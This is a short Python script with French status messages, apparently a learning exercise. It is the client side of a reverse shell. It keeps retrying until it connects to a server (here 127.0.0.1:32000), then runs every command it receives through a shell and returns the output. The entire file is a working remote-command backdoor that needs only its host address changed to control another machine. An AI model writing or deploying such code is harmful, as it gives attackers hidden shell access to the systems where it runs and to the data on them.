


import socket
import time
import subprocess

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024


print("Connexion au serveur", HOST_IP, ", port", HOST_PORT)
while 1:
    try:
        s = socket.socket()           
        s.connect((HOST_IP, HOST_PORT))                       
    except ConnectionRefusedError:
        print("ERREUR: impossible de se connecter au serveur. Reconnexion ...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

while 1:
    commande = s.recv(MAX_DATA_SIZE)   
    print("Commande ", commande.decode())
    reponse = commande.decode()
    resultat = subprocess.run(reponse, shell=True, capture_output=True, universal_newlines=True)
    data_to_send = resultat.stdout + resultat.stderr
    header = str(len(data_to_send.encode())).zfill(13)
    print("header", header)
    s.sendall(header.encode())
    s.sendall(data_to_send.encode())
    
#    if recieve_data:
#        print(recieve_data.decode())       
#    else:
#        print("Aucune data")

s.close()



